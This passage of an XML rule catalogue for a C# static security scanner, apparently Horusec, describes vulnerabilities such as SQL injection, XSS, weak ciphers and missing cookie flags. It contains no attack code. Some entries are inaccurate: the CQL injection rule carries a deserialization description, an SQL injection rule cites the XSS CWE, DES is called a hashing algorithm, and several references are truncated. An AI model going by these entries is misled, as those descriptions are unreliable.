      <![CDATA[Arbitrary code execution, full application compromise or denial of service. An attacker may pass specially crafted serialized .NET object of specific class that will execute malicious code during the construction of the object. For more information access: (https://security-code-scan.github.io/#SCS0036). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-enterprise-library-data' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-enterprise-library-data</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-enterprise-library-data' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0036' target='_blank'>https://security-code-scan.github.io/#SCS0036</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-32</key>
    <name>CQL Injection Cassandra</name>
    <description>
      <![CDATA[Arbitrary code execution, full application compromise or denial of service. An attacker may pass specially crafted serialized .NET object of specific class that will execute malicious code during the construction of the object. For more information access: (https://security-code-scan.github.io/#SCS0038). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cql-injection-cassandra' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cql-injection-cassandra</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cql-injection-cassandra' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0038' target='_blank'>https://security-code-scan.github.io/#SCS0038</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-33</key>
    <name>Password Complexity</name>
    <description>
      <![CDATA[PasswordValidator should have at least two requirements for better security, the RequiredLength property must be set with a minimum value of 8. For more information access: (https://security-code-scan.github.io/#SCS0027). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#password-complexity' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#password-complexity</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#password-complexity' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0027' target='_blank'>https://security-code-scan.github.io/#SCS0027</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-34</key>
    <name>Cookie Without SSL Flag</name>
    <description>
      <![CDATA[It is recommended to specify the Secure flag to new cookie. The Secure flag is a directive to the browser to make sure that the cookie is not sent by unencrypted channel. For more information access: (https://security-code-scan.github.io/#SCS0008) and (https://cwe.mitre.org/data/definitions/614.html). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cookie-without-ssl-flag' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cookie-without-ssl-flag</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cookie-without-ssl-flag' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0008' target='_blank'>https://security-code-scan.github.io/#SCS0008</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-35</key>
    <name>Cookie Without HttpOnly Flag</name>
    <description>
      <![CDATA[It is recommended to specify the HttpOnly flag to new cookie. For more information access: (https://security-code-scan.github.io/#SCS0009) or (https://cwe.mitre.org/data/definitions/1004.html). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cookie-without-httponly-flag' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cookie-without-httponly-flag</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cookie-without-httponly-flag' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0009' target='_blank'>https://security-code-scan.github.io/#SCS0009</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-36</key>
    <name>No input variable</name>
    <description>
      <![CDATA[The application appears to allow XSS through an unencrypted / unauthorized input variable.  <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-input-variable' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-input-variable</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-input-variable' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-37</key>
    <name>Identity Weak Password Complexity</name>
    <description>
      <![CDATA[Weak passwords can allow attackers to easily guess user passwords using wordlist or brute force attacks. Enforcing a strict password complexity policy mitigates these attacks by significantly increasing the time to guess a user&#8217;s valid password. For more information checkout the CWE-521 (https://cwe.mitre.org/data/definitions/521.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#identity-weak-password-complexity' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#identity-weak-password-complexity</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#identity-weak-password-complexity' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/521.html' target='_blank'>https://cwe.mitre.org/data/definitions/521.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-38</key>
    <name>No Log Sensitive Information in console</name>
    <description>
      <![CDATA[The App logs information. Sensitive information should never be logged. For more information checkout the CWE-532 (https://cwe.mitre.org/data/definitions/532.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-log-sensitive-information-in-console' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-log-sensitive-information-in-console</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-log-sensitive-information-in-console' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/532.html' target='_blank'>https://cwe.mitre.org/data/definitions/532.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-39</key>
    <name>OutputCache Conflict</name>
    <description>
      <![CDATA[Having the annotation [OutputCache] will disable the annotation [Authorize] for the requests following the first one. For more information access: (https://security-code-scan.github.io/#SCS0019). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#outputcache-conflict' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#outputcache-conflict</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#outputcache-conflict' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0019' target='_blank'>https://security-code-scan.github.io/#SCS0019</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-40</key>
    <name>Open Redirect</name>
    <description>
      <![CDATA[Your site may be used in phishing attacks. An attacker may craft a trustworthy looking link to your site redirecting a victim to a similar looking malicious site: &#8216; <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#open-redirect' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#open-redirect</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#open-redirect' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-41</key>
    <name>Request Validation Disabled (Attribute)</name>
    <description>
      <![CDATA[Request validation is disabled. Request validation allows the filtering of some XSS patterns submitted to the application. For more information access: (https://security-code-scan.github.io/#SCS0017). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-disabled-attribute' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-disabled-attribute</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-disabled-attribute' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0017' target='_blank'>https://security-code-scan.github.io/#SCS0017</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-42</key>
    <name>SQL Injection OLE DB</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database. For more information access: (https://security-code-scan.github.io/#SCS0020)." <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-ole-db' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-ole-db</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-ole-db' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0020' target='_blank'>https://security-code-scan.github.io/#SCS0020</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-43</key>
    <name>Request Validation Disabled (Configuration File)</name>
    <description>
      <![CDATA[The validateRequest which provides additional protection against XSS is disabled in configuration file. For more information access: (https://security-code-scan.github.io/#SCS0017) or (https://cwe.mitre.org/data/definitions/20.html). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-disabled-configuration-file' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-disabled-configuration-file</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-disabled-configuration-file' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0017' target='_blank'>https://security-code-scan.github.io/#SCS0017</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-44</key>
    <name>SQL Injection MsSQL Data Provider</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database. For more information access: ( <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-mssql-data-provider' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-mssql-data-provider</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-mssql-data-provider' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-45</key>
    <name>Request validation is enabled only for pages</name>
    <description>
      <![CDATA[The requestValidationMode which provides additional protection against XSS is enabled only for pages, not for all HTTP requests in configuration file. For more information access: (https://security-code-scan.github.io/#SCS0030). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-is-enabled-only-for-pages' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-is-enabled-only-for-pages</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#request-validation-is-enabled-only-for-pages' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0030' target='_blank'>https://security-code-scan.github.io/#SCS0030</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-46</key>
    <name>SQL Injection Entity Framework</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database, please use SqlParameter to create query with parameters. For more information access: (https://security-code-scan.github.io/#SCS0035) or ( <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-entity-framework' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-entity-framework</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-entity-framework' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0035' target='_blank'>https://security-code-scan.github.io/#SCS0035</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-47</key>
    <name>View State Not Encrypted</name>
    <description>
      <![CDATA[The viewStateEncryptionMode is not set to Always in configuration file. Web Forms controls use hidden base64 encoded fields to store state information. If sensitive information is stored there it may be leaked to the client side. For more information access: (https://security-code-scan.github.io/#SCS0023) or (https://cwe.mitre.org/data/definitions/200.html). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#view-state-not-encrypted' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#view-state-not-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#view-state-not-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0023' target='_blank'>https://security-code-scan.github.io/#SCS0023</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-48</key>
    <name>SQL Injection Nhibernate</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database. For more information access: (https://security-code-scan.github.io/#SCS0037). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-nhibernate' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-nhibernate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-nhibernate' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0037' target='_blank'>https://security-code-scan.github.io/#SCS0037</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-49</key>
    <name>View State MAC Disabled</name>
    <description>
      <![CDATA[The enableViewStateMac is disabled in configuration file. (This feature cannot be disabled starting .NET 4.5.1). The view state could be altered by an attacker. For more information access: (https://security-code-scan.github.io/#SCS0024) or (https://cwe.mitre.org/data/definitions/807.html). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#view-state-mac-disabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#view-state-mac-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#view-state-mac-disabled' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0024' target='_blank'>https://security-code-scan.github.io/#SCS0024</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-50</key>
    <name>SQL Injection Npgsql</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database. For more information access: (https://security-code-scan.github.io/#SCS0039). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-npgsql' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-npgsql</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-npgsql' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0039' target='_blank'>https://security-code-scan.github.io/#SCS0039</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-51</key>
    <name>Certificate Validation Disabled</name>
    <description>
      <![CDATA[Disabling certificate validation is often used to connect easily to a host that is not signed by a root certificate authority. As a consequence, this is vulnerable to Man-in-the-middle attacks since the client will trust any certificate. For more information access: (https://security-code-scan.github.io/#SCS0004)." <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#certificate-validation-disabled-1' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#certificate-validation-disabled-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#certificate-validation-disabled-1' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0004' target='_blank'>https://security-code-scan.github.io/#SCS0004</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-52</key>
    <name>Weak cipher algorithm</name>
    <description>
      <![CDATA[Broken or deprecated ciphers have typically known weakness. A attacker might be able to brute force the secret key use for the encryption. The confidentiality and integrity of the information encrypted is at risk. For more information access: (https://security-code-scan.github.io/#SCS0010). <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-cipher-algorithm' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-cipher-algorithm</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-cipher-algorithm' target='_blank'> Rule Docs</a> <br/> <a href='https://security-code-scan.github.io/#SCS0010' target='_blank'>https://security-code-scan.github.io/#SCS0010</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-53</key>
    <name>No use Html.Raw</name>
    <description>
      <![CDATA[The application uses the potentially dangerous Html.Raw construct in conjunction with a user-supplied variable. The recommendation is to avoid using HTML assembly, but if it is extremely necessary to allow Html, we suggest the following: support only a fixed subset of Html, after the user submits content, analyze the Html and filter it in a whitelist of allowed tags and attributes. For more information checkout the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory." <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-use-htmlraw' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-use-htmlraw</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-use-htmlraw' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-54</key>
    <name>No log sensitive information debug mode</name>
    <description>
      <![CDATA[The application is configured to display standard .NET errors. This can provide the attacker with useful information and should not be used in a production application.  <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-log-sensitive-information-debug-mode' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-log-sensitive-information-debug-mode</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-log-sensitive-information-debug-mode' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-55</key>
    <name>No return string concat in controller</name>
    <description>
      <![CDATA[A potential Cross-Site Scripting (XSS) was found. The endpoint returns a variable from the client entry that has not been coded. Always encode untrusted input before output, regardless of validation or cleaning performed.  <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-return-string-concat-in-controller' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-return-string-concat-in-controller</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-return-string-concat-in-controller' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-56</key>
    <name>SQL Injection OdbcCommand</name>
    <description>
      <![CDATA[Malicious user might get direct read and/or write access to the database. If the database is poorly configured the attacker might even get Remote Code Execution (RCE) on the machine running the database. For more information checkout the CWE-79 (https://cwe.mitre.org/data/definitions/79.html) advisory." <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-odbccommand' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-odbccommand</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#sql-injection-odbccommand' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/79.html' target='_blank'>https://cwe.mitre.org/data/definitions/79.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-57</key>
    <name>Weak hashing function5 or sha1</name>
    <description>
      <![CDATA[MD5 or SHA1 have known collision weaknesses and are no longer considered strong hashing algorithms. For more information checkout the CWE-326 (https://cwe.mitre.org/data/definitions/326.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-hashing-function5-or-sha1' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-hashing-function5-or-sha1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-hashing-function5-or-sha1' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/326.html' target='_blank'>https://cwe.mitre.org/data/definitions/326.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-58</key>
    <name>Weak hashing function DES Crypto</name>
    <description>
      <![CDATA[DES Crypto have known collision weaknesses and are no longer considered strong hashing algorithms. For more information checkout the CWE-326 (https://cwe.mitre.org/data/definitions/326.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-hashing-function-des-crypto' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-hashing-function-des-crypto</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#weak-hashing-function-des-crypto' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/326.html' target='_blank'>https://cwe.mitre.org/data/definitions/326.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-59</key>
    <name>No Use Cipher mode</name>
    <description>
      <![CDATA[This mode is not recommended because it opens the door to various security exploits. If the plain text to be encrypted contains substantial repetitions, it is possible that the cipher text will be broken one block at a time. You can also use block analysis to determine the encryption key. In addition, an active opponent can replace and exchange individual blocks without detection, which allows the blocks to be saved and inserted into the stream at other points without detection. ECB and OFB mode will produce the same result for identical blocks. The use of AES in CBC mode with an HMAC is recommended, ensuring integrity and confidentiality.  <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-use-cipher-mode' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-use-cipher-mode</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#no-use-cipher-mode' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-60</key>
    <name>Debug Build Enabled</name>
    <description>
      <![CDATA[Binaries compiled in debug mode can leak detailed stack traces and debugging messages to attackers. Disable debug builds by setting the debug attribute to false. For more information checkout the CWE-11 (https://cwe.mitre.org/data/definitions/11.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#debug-build-enabled' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#debug-build-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#debug-build-enabled' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/11.html' target='_blank'>https://cwe.mitre.org/data/definitions/11.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-61</key>
    <name>Vulnerable Package Reference</name>
    <description>
      <![CDATA[Dependencies on open source frameworks and packages introduce additional vulnerabilities into the runtime environment. Vulnerabilities in open source libraries are continuously discovered and documented in publicly available vulnerability databases. Attackers can recognize a package being used by an application, and leverage known vulnerabilities in the library to attack the application. For more information checkout the CWE-937 (https://cwe.mitre.org/data/definitions/937.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#vulnerable-package-reference' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#vulnerable-package-reference</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#vulnerable-package-reference' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/937.html' target='_blank'>https://cwe.mitre.org/data/definitions/937.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-62</key>
    <name>Cors Allow Origin Wild Card</name>
    <description>
      <![CDATA[Cross-Origin Resource Sharing (CORS) allows a service to disable the browser&#8217;s Same-origin policy, which prevents scripts on an attacker-controlled domain from accessing resources and data hosted on a different domain. The CORS Access-Control-Allow-Origin HTTP header specifies the domain with permission to invoke a cross-origin service and view the response data. Configuring the Access-Control-Allow-Origin header with a wildcard (*) can allow code running on an attacker-controlled domain to view responses containing sensitive data. For more information checkout the CWE-942 (https://cwe.mitre.org/data/definitions/942.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cors-allow-origin-wild-card' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cors-allow-origin-wild-card</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#cors-allow-origin-wild-card' target='_blank'> Rule Docs</a> <br/> <a href='https://cwe.mitre.org/data/definitions/942.html' target='_blank'>https://cwe.mitre.org/data/definitions/942.html</a>]]>
    </help>
  </rule>
  <rule>
    <key>HS-CSHARP-63</key>
    <name>Missing Anti Forgery Token Attribute</name>
    <description>
      <![CDATA[Cross Site Request Forgery attacks occur when a victim authenticates to a target web site and then visits a malicious web page. The malicious web page then sends a fake HTTP request (GET, POST, etc.) back to the target website. The victim&#8217;s valid authentication cookie from the target web site is automatically included in the malicious request, sent to the target web site, and processed as a valid transaction under the victim&#8217;s identity. For more information checkout the CWE-352 (https://cwe.mitre.org/data/definitions/352.html) advisory. <br/> <a href='https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#missing-anti-forgery-token-attribute' target='_blank'> https://docs.horusec.io/docs/cli/analysis-tools/open-source-horusec-engine/horusec-csharp#missing-anti-forgery-token-attribute</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
